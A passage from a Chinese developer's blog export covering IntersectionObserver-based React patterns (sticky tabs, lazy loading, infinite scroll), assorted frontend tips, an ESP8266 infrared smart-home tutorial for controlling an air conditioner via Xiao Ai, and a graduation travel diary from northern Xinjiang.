      handleFixed(containerRef.current, tabbarRef.current);
    &#125;
  &#125;, []);

  const handleFixed = (containerEle, tabbarEle) =&gt; &#123;
    const observer = new IntersectionObserver((entries) =&gt; &#123;
      entries.forEach((entry) =&gt; &#123;
        if (entry.isIntersecting) &#123;
          tabbarEle.setAttribute(&#39;class&#39;, &#39;tabbar--fixed&#39;);
        &#125; else &#123;
          tabbarEle.setAttribute(&#39;class&#39;, &#39;tabbar--unfixed&#39;);
        &#125;
      &#125;)
    &#125;, &#123;
      threshold: 1, //元素完全可见时触发回调函数
    &#125;);
    observer.observe(containerEle); //开始观察
  &#125;

  return (
    &lt;View ref=&#123;containerRef&#125; className=&quot;container&quot; &gt;
      &lt;Tabbar ref=&#123;tabbarRef&#125; /&gt;
    &lt;/View&gt;
  )
&#125;</code></pre>
<pre><code class="css">.container &#123;
  position: fixed;
  top: 0;
  left: 0;
&#125;

.tabbar--fixed &#123;
  position: fixed;
  top: 0;
  left: 0;
  ...  /* 吸顶样式 */
&#125;

.tabbar--unfixed &#123;
  position: relative;
  ...  /* 未吸顶样式 */
&#125;</code></pre>
<p>看起来代码更烦了，但实际上可操作性更好。不用通过命令式地计算父子元素间的相对距离判断是否相交，而是声明式地把判断依据交给底层 API 实现。从 scroll 到 IntersectionObserver，性能也提升了不少。由于监听 scroll 事件密集发生，计算量很大，容易造成性能问题（套个节流函数 →_→）；而 IntersectionObserver 则是通过回调实现，只在临界计算一次，所以性能比较好。</p>
<h3 id="电梯导航"><a href="#电梯导航" class="headerlink" title="电梯导航"></a>电梯导航</h3><p><img  src="https://pic.izhaoo.com/20210801222344.gif"  ><span class="image-caption">电梯效果</span></p>
<p>不久，视觉同学提议将导航改成电梯导航，没问题……</p>
<p>电梯导航可以拆成两块逻辑：1、点击导航项滑动至对应模块顶部。2、页面滚动时判断视口内的模块并切换导航。</p>
<p>滑动模块：点击事件发生时调用 <code>window.scrollTo()</code> 方法平滑页面，平滑高度通过 <code>getElementById(id).offsetTop</code> 获取。</p>
<p>切换导航：切入正题，使用 <strong>IntersectionObserver</strong> 监听模块元素和根元素（root）的可视状态，组合 <strong>isIntersecting</strong>（是否进入视口）和<strong>intersectionRatio</strong>（进入视口的比例）判断模块全部进入视口时切换 Tab。</p>
<pre><code class="jsx">const tabMap = [&#39;raider&#39;, &#39;show&#39;, &#39;poi&#39;];

export default function Main() &#123;
  const [tab, setTab] = useState(&#39;raider&#39;);

  useEffect(() =&gt; &#123;
    const tabEle = tabMap.map(item =&gt; document.getElementById(item));  //获取DOM
    handleElevator(tabEle);
  &#125;, [])

  const handleElevator = (tabEle) =&gt; &#123;
    const observer = new IntersectionObserver((entries) =&gt; &#123;
      entries.forEach((entry) =&gt; &#123;
        if (entry.isIntersecting &amp;&amp; entry.intersectionRatio === 1) &#123;  //当模块全部滑入页面时
          setTab(entry.target.id);  //切换Tab
        &#125;
      &#125;);
    &#125;)
    tabEle.forEach(item =&gt; observer.observe(item));  //遍历Tab设置监听
  &#125;

  const handleClick = (id) =&gt; &#123;
    setTab(id)
    window.scrollTo(&#123;
      top: document.getElementById(id).offsetTop,  //点击Tab项滑动至对应模块顶部
      behavior: &#39;smooth&#39;  //平滑效果
    &#125;);
  &#125;

  return (
    &lt;View className=&quot;container&quot;&gt;
      &lt;Tabbar tab=&#123;tab&#125; onClick=&#123;() =&gt; handleClick(id)&#125; /&gt;
      &lt;RaiderGroup id=&quot;raider&quot; /&gt;
      &lt;ShowGroup id=&quot;show&quot; /&gt;
      &lt;PoiGroup id=&quot;poi&quot; /&gt;
    &lt;/View&gt;
  );
&#125;</code></pre>
<h3 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h3><p>同理，判断图片进入可视区后将 <em>src</em> 中的占位图替换为 <em>data-src</em> 中的真实地址即可。</p>
<pre><code class="jsx">export default function Lazyload() &#123;
  useEffect(() =&gt; &#123;
    const imagesEle = document.getElementsByClassName(&quot;image-lazyload&quot;);
    const containerEle = getElementById(&quot;container&quot;);
    handleLazyload(imagesEle, containerEle);
  &#125;, [])

  const handleLazyload = (imagesEle, containerEle) =&gt; &#123;
    const observer = new IntersectionObserver((entries) =&gt;&#123;
      entries.forEach(item =&gt; &#123;
        if (item.isIntersecting) &#123;
          item.target.src = item.target.getAttribute(&quot;data-src&quot;);  //替换真实图片
          observer.unobserve(item.target);  //取消监听
        &#125;
      &#125;)
    &#125;, &#123;
      root: containerEle
    &#125;);
    imagesEle.forEach(item =&gt; observer.observe(item));  //遍历图片设置监听
  &#125;

  return (
    &lt;View id=&quot;container&quot;&gt;
      &lt;Image className=&quot;image-lazyload&quot; data-src=&quot;...&quot; /&gt;
      &lt;Image className=&quot;image-lazyload&quot; data-src=&quot;...&quot; /&gt;
      &lt;Image className=&quot;image-lazyload&quot; data-src=&quot;...&quot; /&gt;
      ...
    &lt;/View&gt;
  )
&#125;</code></pre>
<h3 id="无限加载"><a href="#无限加载" class="headerlink" title="无限加载"></a>无限加载</h3><p>同理，判断页面划到底部时（Loading 进入视口时），获取数据并插入，可以设置预加载高度提前加载。</p>
<pre><code class="jsx">export default function LoadMore() &#123;
  const [data, setData] = useState([])

  useEffect(() =&gt; &#123;
    const loadingEle = document.getElementById(&quot;loading&quot;);
    handleLoadMore(loadingEle);
  &#125;, [])

  const handleLoadMore = (loadingEle, preload) =&gt; &#123;
    const observer = new IntersectionObserver((entries) =&gt;&#123;
      entries.forEach((entry) =&gt; &#123;
        if (entry.isIntersecting) &#123;  //Loading进入视口时，即划到底部时
          fetchData();  //获取数据
        &#125;
      &#125;)
    &#125;, &#123;
      rootMargin: `0px 0px $&#123;preload&#125;px 0px`, // 提前加载高度
    &#125;);
    observer.observe(loadingEle);  //设置监听
  &#125;

  const fetchData = async () =&gt; &#123;
    const res = await get(...);
    if (res.isSuccess) &#123;
      setData(data.concat(res.data));  //插入数据
    &#125;
  &#125;

  return (
    &lt;View id=&quot;container&quot;&gt;
      &#123;data &amp;&amp; data.length &gt; 0 &amp;&amp; data.map(item =&gt; &lt;View /&gt;)&#125;  &#123;/* 渲染元素 */&#125;
      &lt;Loading className=&quot;loading&quot; /&gt;
    &lt;/View&gt;
  )
&#125;</code></pre>
<h3 id="曝光埋点"><a href="#曝光埋点" class="headerlink" title="曝光埋点"></a>曝光埋点</h3><p>同理，需要判断元素全部进入可视区域时触发。</p>
<pre><code class="jsx">export default function Exposure() &#123;
  useEffect(() =&gt; &#123;
    const expEle = document.getElementsByClassName(&quot;need-exp&quot;);
    handleExposure(expEle);
  &#125;, [])

  const handleExposure = (expEle) =&gt; &#123;
    const observer = new IntersectionObserver((entries) =&gt;&#123;
      entries.forEach(item =&gt; &#123;
        if (item.intersectionRatio === 1) &#123;  //元素全部进入可视区域时
          ...  //曝光逻辑
          observer.unobserve(item.target);  //取消监听
        &#125;
      &#125;)
    &#125;, &#123;
      threshold: 1  //当元素全部进入可视区时触发
    &#125;);
    expEle.forEach(item =&gt; observer.observe(item));  //遍历元素设置监听
  &#125;

  return (
    &lt;View id=&quot;container&quot;&gt;
      &lt;View className=&quot;need-exp&quot; /&gt;
      &lt;View className=&quot;need-exp&quot; /&gt;
      &lt;View className=&quot;need-exp&quot; /&gt;
      ...
    &lt;/View&gt;
  )
&#125;</code></pre>
<h3 id="滚动动画"><a href="#滚动动画" class="headerlink" title="滚动动画"></a>滚动动画</h3><p><img  src="https://pic.izhaoo.com/20210803223246.gif"  ><span class="image-caption">滚动效果</span></p>
<p>之前业务需要轮播图自适应图片高度，勉强还原了视觉效果。但是可以看到效果并不是最佳，自适应动画是在图片切换完成后才触发的，并没有实现跟手。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>搬砖笔记</title>
    <url>/2021/08/01/code-note/</url>
    <content><![CDATA[<p>搬砖杂记，前端是门手艺活，我家狗看多了都会写。</p>
<span id="more"></span>

<h3 id="子组件监听滚动"><a href="#子组件监听滚动" class="headerlink" title="子组件监听滚动"></a>子组件监听滚动</h3><p>React 子组件生命周期中 <em>addEventListener</em> 的时候，需要将第三个参数设置为 <code>true</code>。因为 React 对事件做了合成处理，子组件滚动是捕获事件，父组件滚动是冒泡事件。addEventListener 第三个参数默认为 <em>false</em>，只监听冒泡事件，所以子组件的捕获事件默认监听不到，需要改成 <em>true</em>。</p>
<pre><code class="javascript">useEffect(() =&gt; &#123;
  window.addEventListener(&quot;scroll&quot;, (e) =&gt; &#123;
    const &#123;top, bottom, left, right&#125; = e.target.getBoundingClientRect();
  &#125;, true);
&#125;, []);</code></pre>
<h3 id="浮层禁止背景滚动"><a href="#浮层禁止背景滚动" class="headerlink" title="浮层禁止背景滚动"></a>浮层禁止背景滚动</h3><p><em>rxpi-pad</em> 浮动面板有个坑，面板滚动事件和背景滚动事件做了绑定，通过 <em>autoLockScrolling</em> 属性只能全部开启或关闭。一般我们需要让背景禁止滚动，而面板内容可以滚动，只能 hack 一下：</p>
<pre><code class="javascript">useEffect(() =&gt; &#123;
  const body = document.body;
  if (visible) &#123;
    body.style.overflow = &quot;hidden&quot;;
  &#125; else &#123;
    body.style.overflow = &quot;visible&quot;;
  &#125;
&#125;, [visible]);</code></pre>
<h3 id="在数组指定项插入数组"><a href="#在数组指定项插入数组" class="headerlink" title="在数组指定项插入数组"></a>在数组指定项插入数组</h3><p>JavaScript 中的 <em>splice</em> 只能在数组中删除或插入一个元素，而不能插入数组，可借助 <strong>apply</strong> 赋能。</p>
<pre><code class="javascript">const arr1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]; 
const arr2 = [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]; 
arr2.unshift(1, 1);
Array.prototype.splice.apply(arr1, arr2);
console.log(arr1)  // [&quot;a&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;c&quot;]</code></pre>
<p>相当于：</p>
<pre><code class="javascript">const arr1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]; 
const arr2 = [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;];
arr1.splice(1, 1, &#39;1&#39;, &#39;2&#39;, &#39;3’);</code></pre>
<h3 id="标签换行截断"><a href="#标签换行截断" class="headerlink" title="标签换行截断"></a>标签换行截断</h3><p>标签组都会设置一个宽度，当标签过多或过长时，最后一项会被“砍掉”，很尴尬。给容器设置一个固定高度和换行，将超出部分顶到第二行隐藏，干掉总比破掉好。</p>
<p><img  src="https://pic.izhaoo.com/20210801001641.jpg"  ><span class="image-caption">超出截断</span></p>
<p><img  src="https://pic.izhaoo.com/20210801001546.jpg"  ><span class="image-caption">超出隐藏</span></p>
<pre><code class="css">.tags-wrapper &#123;
  height: 40rpx;  /* 标签高度 */
  flex-wrap: wrap;
  overflow: hidden;
&#125;</code></pre>
<h3 id="iphoneX-适配"><a href="#iphoneX-适配" class="headerlink" title="iphoneX 适配"></a>iphoneX 适配</h3><p>iphoneX 这破手机就是反人类，丑得要死，给前端小哥哥烦的要死，适配 iphoneX 也是老生常谈的事。一次业务中遇到个非主流坑，淘宝端 iphoneX 底部会多出一块白条，其他客户端和机型都没问题。通过层级定位后发现这个白条是在容器外部产生的，甚至可能是客户端处。最后师兄一句 <code>height: 100vh</code> 解决。</p>
<p>这不是 iphoneX 适配标准解法吗？？？</p>
<p>666！！！</p>
<p><strong>方案一</strong></p>
<p><em>适用于版本 &gt;= IOS11</em></p>
<p>在 HTML 头部 <em>viewport</em> 标签中，将 <em>viewport-fit</em> 值设置为 <code>contain</code>。（视口完全包含网页内容，头部位置固定元素将被包含在ios11的安全区域内）</p>
<p>在 CSS 中使用以下布局常数，将布局限定在安全容器内：</p>
<ul>
<li>constant(safe-area-inset-top)</li>
<li>constant(safe-area-inset-bottom)</li>
<li>constant(safe-area-inset-left)</li>
<li>constant(safe-area-inset-right)</li>
</ul>
<pre><code class="css">.container &#123;
  padding: constant(safe-area-inset-top) constant(safe-area-inset-right) constant(safe-area-inset-bottom) constant(safe-area-inset-left);
&#125;</code></pre>
<p><strong>方案二</strong></p>
<pre><code class="css">position: absolute;
top: ???;
bottom: ???;</code></pre>
<p>绝对定位一把梭，不服就干，怕过谁。劳资的代码只有 <strong>absolute</strong>！</p>
<h3 id="useState-同步获取最新状态值"><a href="#useState-同步获取最新状态值" class="headerlink" title="useState 同步获取最新状态值"></a>useState 同步获取最新状态值</h3><p>React 中 <code>this.setState()</code> 的第二个参数可以传入一个回调函数用于获取实时更新后的状态值，例如：</p>
<pre><code class="javascript">this.setState(&#123;
  username: &#39;兆兆&#39;
&#125;, () =&gt; &#123;
  console.log(this.state.username);
&#125;);</code></pre>
<p>但是 Hooks 中的 useState 官方却把它干掉了，我们可以结合 useState、useRef、useEffect 来模拟一个：</p>
<pre><code class="js">const useCallbackState = (state) =&gt; &#123;
  const ref = useRef();
  const [data, setData] = useState(state);

  useEffect(() =&gt; &#123;
    ref.current &amp;&amp; ref.current(data);
  &#125;, [data]);

  return [data, function (val, callback) &#123;
    ref.current = callback;
    setData(val);
  &#125;];
&#125;</code></pre>
<p>似乎蕴含了点哲学：</p>
<ul>
<li>useState：异步存储数据</li>
<li>useRef：同步缓存最新数据</li>
<li>useEffect：监测数据状态变更</li>
</ul>
<h3 id="Taro-点击穿透"><a href="#Taro-点击穿透" class="headerlink" title="Taro 点击穿透"></a>Taro 点击穿透</h3><p>在使用 Taro 开发小程序时，被点击穿透坑了。背景如图，在一个评论浮层中点击输入框，点击事件会穿透到底部的浮层上，直接把浮层关了。Taro 文档汇总说明需要使用 <code>e.stopPropagation()</code> 代替小程序中的 <code>catchEvent</code>，然并卵。查看源码后发现，Taro 在编译过程中会直接将 <code>e.stopPropagation()</code> 转换为 <code>catchEvent</code> 打到 <code>wxml</code> 上，这套路…后来发现，在自定义组件中，这条逻辑不生效。解决方案是只需要在自定义组件外层再套一层 <code>View</code>，并加上 <code>e.stopPropagation()</code> 即可。</p>
<p><img  src="https://pic.izhaoo.com/20210815123034.jpg"  ><span class="image-caption">评论浮层</span></p>
<h3 id="forEach-异步调用"><a href="#forEach-异步调用" class="headerlink" title="forEach 异步调用"></a>forEach 异步调用</h3><p>最近开发的小程序发布评论提审被驳回了，需要接入安全风控中心。整个流程如下：1、首先通过 LeanCloud 接口获取获取存储在 BaaS 上的评论数据。2、遍历评论列表，将每条评论内容上传至云函数。3、通过审核接口获取内容敏感程度，剔除不正能量的内容。过程中多次使用 <code>forEach</code> 遍历，并且在遍历过程中调用了异步接口。<code>forEach</code> 本身是同步的，但是在遍历中如果调用了异步代码，并不会阻塞进程，很有可能还没拿到结果就执行了后续的代码。有如下解决方案：</p>
<p><strong>内部同步，外部异步</strong></p>
<pre><code class="javascript">comments.forEach(async (item, index) =&gt;&#123;
  await secCheck(item);
  filterRes(item);
  return item;
&#125;)</code></pre>
<p><strong>内部异步，外部同步</strong></p>
<pre><code class="javascript">const asyncFunc = [];
comments.forEach((item, index) =&gt;&#123;
  asyncFun.push(secCheck(item));
  filterRes(item);
&#125;)
Promise.all(asyncFun).then((res) =&gt; &#123;
  return res;
&#125;);</code></pre>
<p><strong>内部外部都同步</strong></p>
<pre><code class="javascript">Promise.all(
  comments.map( item =&gt;&#123;
    return new Promise(async (resolve, reject) =&gt;&#123;
      await secCheck(item);
      filterRes(item);
      resolve();
    &#125;)
  &#125;)
).then((res) =&gt;&#123;
  return res;
&#125;)</code></pre>
<h3 id="常用-Hooks-封装"><a href="#常用-Hooks-封装" class="headerlink" title="常用 Hooks 封装"></a>常用 Hooks 封装</h3><p><strong>缓存状态</strong></p>
<p>获取上一次执行的状态。</p>
<pre><code class="javascript">const usePrevious = (value: any) =&gt; &#123;
  const ref = useRef();
  useEffect(() =&gt; &#123;
    ref.current = value;
  &#125;, [value]);
  return ref.current;
&#125;</code></pre>
<p><strong>批量设置状态</strong></p>
<p>像 <code>this.setState()</code> 一样批量设置状态。</p>
<pre><code class="javascript">const useSet = (initState: any) =&gt; &#123;
  return useReducer((state: any, newState: any) =&gt; &#123;
    return &#123; ...state, ...newState &#125;;
  &#125;, initState);
&#125;</code></pre>
<p><strong>节流</strong></p>
<pre><code class="javascript">const useThrottle = (fn: any, delay: number, dep = []) =&gt; &#123;
  const &#123; current &#125; = useRef(&#123; fn, timer: null &#125;);
  useEffect(
    function () &#123;
      current.fn = fn;
    &#125;,
    [fn],
  );

  return useCallback(function f(...args: any) &#123;
    if (!current.timer) &#123;
      current.timer = setTimeout(() =&gt; &#123;
        delete current.timer;
      &#125;, delay);
      current.fn(...args);
    &#125;
  &#125;, dep);
&#125;</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>js</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>ESP8266 - 小爱同学智能家居</title>
    <url>/2021/07/10/esp8266-xiaoai-smart-home/</url>
    <content><![CDATA[<p>基于 ESP8266 和 Blinker 组件智能家居，使用小爱同学控制普通空调和电视机等设备。</p>
<span id="more"></span>

<p>&lt;封面摄于新疆·禾木的山间，高原下的寒松和草甸一片苍翠欲滴，哈萨克牧民就在山麓和山顶间来回迁徙。&gt;</p>
<p>最近打工人搬进了出租房，闲鱼捡了个小爱触屏音箱，一百来块钱居然可以组 Mesh 网络，遂决定撘一套智能家居。可是这儿的空调、电视等都是传统设备，不支持物联网，改线又会被房东打死。唯一的办法就是借助红外遥控实现，搜了一下小米万能红外遥控器居然要一百多块钱，咋不去抢钱呢。于是默默地翻出积灰的电子元器件箱，掏出了几年前买的 ESP8266 板子，自己做一个吧，八要钱。</p>
<p>下面以控制 LG 空调为例，整套智能家居架构如下：</p>
<p>小爱触屏音箱 → Blinker（IRremote） → 电气设备</p>
<ol>
<li>米家接入 Bliker（点灯科技）物联网平台。</li>
<li>ESP8266 刷入 Blinker 固件，作为物联网终端。</li>
<li>ESP8266 基于 IRremote 库发射红外信号，控制空调等设备。</li>
</ol>
<h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>需要准备以下硬件，按如下方式接线：</p>
<ul>
<li>ESP8266 开发板（NodeMUC）</li>
<li>红外二极管</li>
<li>100Ω 电阻</li>
<li>面包线（母对母）若干</li>
</ul>
<p><img  src="https://pic.izhaoo.com/20201022171055529.png"  ><span class="image-caption">接线图</span></p>
<p><img  src="https://pic.izhaoo.com/20210710222545.png"  ><span class="image-caption">接好后，很挫</span></p>
<h2 id="Blinker"><a href="#Blinker" class="headerlink" title="Blinker"></a>Blinker</h2><p><a href="https://www.diandeng.tech/home">点灯科技</a></p>
<p>首先在手机上安装点灯 APP 并打开。</p>
<p>点击右上角加号添加设备，选择 <em>独立设备</em> → <em>网络接入</em> → <em>点灯科技</em>，把 <strong>key</strong> 保存一下，后面需要用到。</p>
<p><img  src="https://pic.izhaoo.com/20210710220836.png"  ><span class="image-caption">添加设备</span></p>
<p><img  src="https://pic.izhaoo.com/20210710220816.png"  ><span class="image-caption">独立设备</span></p>
<p>点击右上角的编辑，定制遥控界面。</p>
<p><img  src="https://pic.izhaoo.com/20210710221315.png"  ><span class="image-caption">编辑遥控界面</span></p>
<p>点击右上角的三个点，可以重命名设备，方便之后语言控制。</p>
<p><img  src="https://pic.izhaoo.com/20210710221709.png"  ><span class="image-caption">重命名设备</span></p>
<p>在 Blinker APP 中编辑按钮，添加语音指令。</p>
<p><img  src="https://pic.izhaoo.com/20210715144417.jpg"  ><span class="image-caption">语音指令</span></p>
<h2 id="米家"><a href="#米家" class="headerlink" title="米家"></a>米家</h2><p>打开米家 APP，在 <em>我的</em> 页面，点击 <em>其他平台设备</em>，点击 <em>添加设备</em>，拉下来选择 <em>点灯科技</em>。</p>
<p><img  src="https://pic.izhaoo.com/20210710221905.png"  ><span class="image-caption">其他平台设备</span></p>
<p><img  src="https://pic.izhaoo.com/20210710221922.png"  ><span class="image-caption">点灯科技</span></p>
<p>输入点灯科技注册的账号和密码，绑定账号。</p>
<p><img  src="https://pic.izhaoo.com/20210710221934.png"  ><span class="image-caption">绑定账号</span></p>
<p>点击同步设备，可以发现刚才在点灯平台添加的设备。</p>
<p><img  src="https://pic.izhaoo.com/20210710222323.png"  ><span class="image-caption">同步设备</span></p>
<h2 id="刷入固件"><a href="#刷入固件" class="headerlink" title="刷入固件"></a>刷入固件</h2><p>首先下载并安装 <a href="http://www.arduino.cn/thread-5838-1-1.html">Arduion-IDE</a> 打开，我们需要安装 ESP8266 相关库。</p>
<p>在 <em>文件 → 首选项 → 附加开发板管理配置</em> 中添加 ESP8266 的官方源：<code>http://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p>
<p><img  src="https://pic.izhaoo.com/20210715141625.jpg"  ><span class="image-caption">添加源</span></p>
<p><del>然后在 <em>工具 → 管理包</em> 中搜索 <code>IRremoteESP8266</code> 安装这个包，用来控制输出红外信号的。</del></p>
<p><img  src="https://pic.izhaoo.com/20210715142207.jpg"  ><span class="image-caption">安装 IRremoteESP8266</span></p>
<p>也可以直接在 GitHub 下载 master 分支文件，丢到 <code>Arduino安装目录\Arduino\libraries</code> 目录下，需要下载以下包：</p>
<ul>
<li><a href="https://github.com/crankyoldgit/IRremoteESP8266">IRremoteESP8266</a></li>
<li><a href="https://github.com/blinker-iot/blinker-library">blinker-library</a></li>
</ul>
<p>然后在编辑器中输入以下代码：</p>
<pre><code class="c">#define BLINKER_PRINT Serial
#define BLINKER_WIFI
#define BLINKER_MIOT_LIGHT

#include &lt;ESP8266WiFi.h&gt;
#include &lt;IRremoteESP8266.h&gt;
#include &lt;IRsend.h&gt;
#include &lt;ir_LG.h&gt;  // 换成对应型号空调
#include &lt;Blinker.h&gt;

char auth[] = &quot;**********&quot;;  // Bliker key
char ssid[] = &quot;**********&quot;;  // WiFi 名称
char pswd[] = &quot;**********&quot;;  // WiFi 密码

BlinkerButton Button1(&quot;btn-abc&quot;);  // 按钮名称换成 Blinker 中设置的名称
IRLgAc _ac(D3);  // D3 对应开发板上火线口


// 按钮
void button1_callback(const String &amp; state) &#123;
  BLINKER_LOG(&quot;get button state: &quot;, state);
  if (state == &quot;on&quot;) &#123;
    digitalWrite(LED_BUILTIN, LOW);
    Button1.print(&quot;on&quot;);
    IRLgAc _ac(D3);
    _ac.begin();
    _ac.on();
    _ac.send();
  &#125; else if (state == &quot;off&quot;) &#123;

    digitalWrite(LED_BUILTIN, HIGH);
    Button1.print(&quot;off&quot;);
    IRLgAc _ac(D3);
    _ac.begin();
    _ac.off();
    _ac.send();
  &#125;
&#125;

//小爱
void miotPowerState(const String &amp; state)
&#123;
  BLINKER_LOG(&quot;need set power state: &quot;, state);

  if (state == BLINKER_CMD_ON) &#123;
    digitalWrite(LED_BUILTIN, LOW);
    BlinkerMIOT.powerState(&quot;on&quot;);
    BlinkerMIOT.print();
    IRLgAc _ac(D3);
    _ac.begin();
    _ac.on();
    _ac.send();
  &#125;
  else if (state == BLINKER_CMD_OFF) &#123;
    digitalWrite(LED_BUILTIN, HIGH);
    BlinkerMIOT.powerState(&quot;off&quot;);
    BlinkerMIOT.print();
    IRLgAc _ac(D3);
    _ac.off();
    _ac.send();
  &#125;
&#125;

void setup() &#123;
  Serial.begin(115200);
  BLINKER_DEBUG.stream(Serial);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Blinker.begin(auth, ssid, pswd);
  Button1.attach(button1_callback);
  BlinkerMIOT.attachPowerState(miotPowerState);

&#125;

void loop() &#123;
  Blinker.run();
&#125;</code></pre>
<p>然后用 USB 线连接至电脑，点击输入按钮刷入即可。</p>
<p><img  src="https://pic.izhaoo.com/20210715143716.jpg"  ><span class="image-caption">输入固件</span></p>
<p>可以在 [IRremoteESP8266 包的目录下找到几乎所有型号的空调，更改一下代码即可。</p>
<p><img  src="https://pic.izhaoo.com/20210715143910.jpg"  ><span class="image-caption">空调型号</span></p>
<p><img  src="https://pic.izhaoo.com/20210715144057.jpg"  ><span class="image-caption">类名</span></p>
<h3 id="开始装逼"><a href="#开始装逼" class="headerlink" title="开始装逼"></a>开始装逼</h3><p>一切都妥当后，将 ESP8266 和小爱同学连接至同一 WiFi 下。唤起小爱同学，输入刚才编辑的语音指令，即可发送红外信号控制电器设备。</p>
<p>这里只是简单地示范了一下开/关 LG 空调，后续请学习相关库的文档，自行开启高阶能力。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>arduino</tag>
        <tag>esp8266</tag>
        <tag>IoT</tag>
        <tag>智能家居</tag>
      </tags>
  </entry>
  <entry>
    <title>毕业旅行 - 北疆</title>
    <url>/2021/07/02/graduation-trip/</url>
    <content><![CDATA[<p>心上人，我在可可托海等你；他们说，你嫁到了伊犁。</p>
<span id="more"></span>   

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1819636482&auto=0&height=66"></iframe>

<p>终于还是毕业了，国际惯例，得来一次毕业旅行。本着垃圾佬薅羊毛的精神，抢到了南航的奇遇旅行票，“杭州 - 乌鲁木齐” 来回只需四百大洋，这不白给，说走就走。第一次到这么远的地方，从祖国的东边到西边，横跨了一只雄鸡。</p>
<h3 id="乌鲁木齐"><a href="#乌鲁木齐" class="headerlink" title="乌鲁木齐"></a>乌鲁木齐</h3><p>之前听新疆的朋友说，他们这儿晚上八九点才下班。我说原来不只是杭州，资本的魔爪已经遍地蔓延。原来是我想多了，这儿晚上九点太阳才会落下，早上六点又升起，白天很长，留给夜晚的时间很短。我悟了，原来爱要趁早<del>做</del>，一不小心天就亮了。</p>
<p><img  src="https://pic.izhaoo.com/20210714213353.jpg"  ><span class="image-caption">晚上九点半的乌鲁木齐</span></p>
<p>第二天，我们踏上了旅程，整整八小时行驶在茫茫戈壁滩。</p>
<p><img  src="https://pic.izhaoo.com/20210628211839.jpg"  ><span class="image-caption">戈壁滩</span></p>
<p><img  src="https://pic.izhaoo.com/20210628211901.jpg"  ><span class="image-caption">还是戈壁滩</span></p>
<p><img  src="https://pic.izhaoo.com/20210628211810.jpg"  ><span class="image-caption">骑士</span></p>
<h3 id="可可托海"><a href="#可可托海" class="headerlink" title="可可托海"></a>可可托海</h3><p>一直以为可可托海是个湖，结果到了才发现是个地名。</p>
<p><img  src="https://pic.izhaoo.com/20210628214531.jpg"  ><span class="image-caption">石碑</span></p>
<p>《可可托海的牧羊人》上了春晚，这是真正的“可可托海的牧羊人”。你以为他很孤独？其实他很有钱……一羊一千钱，百羊价几何？</p>
<p><img  src="https://pic.izhaoo.com/20210628211713.jpg"  ><span class="image-caption">可可托海牧羊人</span></p>
<p><img  src="https://pic.izhaoo.com/20210714214035.jpg"  ><span class="image-caption">拦路🐑</span></p>
<p>驱车八小时赶到可可托海，又坐了半小时的区间车才到神钟山景点，结果飞了半小时的无人机就被遣出来了，因为下班了……</p>
<p><img  src="https://pic.izhaoo.com/20210628214557.jpg"  ><span class="image-caption">神钟山</span></p>
<p><img  src="https://pic.izhaoo.com/20210628214612.jpg"  ><span class="image-caption">神钟山</span></p>
<h3 id="禾木"><a href="#禾木" class="headerlink" title="禾木"></a>禾木</h3><p><img  src="https://pic.izhaoo.com/20210628211558.jpg"  ><span class="image-caption">路边的童话镇</span></p>
<p><img  src="https://pic.izhaoo.com/20210628211131.jpg"  ><span class="image-caption">山路十八弯</span></p>
<p><img  src="https://pic.izhaoo.com/20210714214055.jpg"  ><span class="image-caption">第一次🏇</span></p>
<p><img  src="https://pic.izhaoo.com/20210628214443.jpg"  ><span class="image-caption">幸运的🌈</span></p>
<p><img src="https://pic.izhaoo.com/20210628213000.jpg" alt=""></p>
<p><img src="https://pic.izhaoo.com/20210628213338.jpg" alt=""></p>
<p><img src="https://pic.izhaoo.com/20210628213528.jpg" alt=""></p>
<p><img src="https://pic.izhaoo.com/20210628213548.jpg" alt=""></p>
<h3 id="喀纳斯"><a href="#喀纳斯" class="headerlink" title="喀纳斯"></a>喀纳斯</h3><p><img  src="https://pic.izhaoo.com/20210714213957.jpg"  ><span class="image-caption">喀纳斯湖</span></p>
<p><img  src="https://pic.izhaoo.com/20210714214017.jpg"  ><span class="image-caption">雪山</span></p>
<h3 id="“美食”"><a href="#“美食”" class="headerlink" title="“美食”"></a>“美食”</h3><p>吃货朋友还是不建议来新疆了，这儿的主食就那么几种：馕、拌面、烤肉、乌苏……因为物资比较匮乏，价格也比内地贵一些。</p>
<p>这儿的民众普遍信奉伊斯兰教，猪肉是不存在的。</p>
<p><img  src="https://pic.izhaoo.com/20210613201055.jpg"  ><span class="image-caption">兰州牛肉面</span></p>
<p>靠近甘肃，兰州牛肉面应该是比较正宗的，牛肉还是那么几片。😅</p>
<p><img  src="https://pic.izhaoo.com/20210613195935.jpg"  ><span class="image-caption">大盘鸡</span></p>
<p>在偏远乡村吃到的大盘鸡，因为加了一些香料，确实比内地“兰州牛肉面”店里的大盘鸡好吃多了。</p>
<p><img  src="https://pic.izhaoo.com/20210613201021.jpg"  ><span class="image-caption">过油肉拌面</span></p>
<p>过油肉拌面还行。</p>
<p><img  src="https://pic.izhaoo.com/20210613201201.jpg"  ><span class="image-caption">椒麻鸡</span></p>
<p>椒麻鸡拌面，也可。</p>
<p><img  src="https://pic.izhaoo.com/20210615205022.jpg"  ><span class="image-caption">冷水鱼</span></p>
<p>在富蕴县吃到了冷水鱼，因为生活在雪水中，生长缓慢，所以肉质紧实。价格也很美丽，一条貌似要两百大洋。这天干了四瓶夺命大乌苏，脸通红差点醉倒，没想到居然有一天我会被 🍺 干翻，</p>
<p><img  src="https://pic.izhaoo.com/20210613201208.jpg"  ><span class="image-caption">馕坑架子肉</span></p>
<p>把羊肉架在馕坑中烤，香。</p>
